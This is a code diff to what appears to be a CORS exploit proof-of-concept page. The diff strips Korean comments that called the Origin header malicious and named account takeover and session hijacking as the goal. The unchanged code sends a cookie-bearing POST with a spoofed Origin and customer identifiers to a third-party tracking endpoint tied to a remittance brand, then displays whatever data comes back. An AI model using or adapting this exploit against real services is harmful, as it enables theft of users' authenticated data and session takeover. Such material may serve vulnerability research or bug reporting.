@@ -12,10 +12,10 @@
         // CORS Exploit Request
         fetch("https://remitly.tod8mp.net/xur/10408", {
             method: "POST",
-            credentials: "include", // 쿠키를 포함한 자격 증명을 함께 전송
+            credentials: "include", 
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
-                "Origin": "https://stargazer0.github.io" // 악의적인 Origin 헤더
+                "Origin": "https://stargazer0.github.io" 
             },
             body: "_ir=U81%7C%7C1724675136005%7Ce436e5b4&custid=0413d465200d90b9d46a172afe2a6039"
         })
@@ -29,7 +29,7 @@
         .then(data => {
             document.getElementById("output").textContent = `Request succeeded: ${JSON.stringify(data)}`;
             console.log("Data received:", data);
-            // 데이터 처리: 예를 들어, 계정 탈취나 세션 하이재킹
+            
         })
         .catch(error => {
             document.getElementById("output").textContent = `Request failed: ${error.message}`;
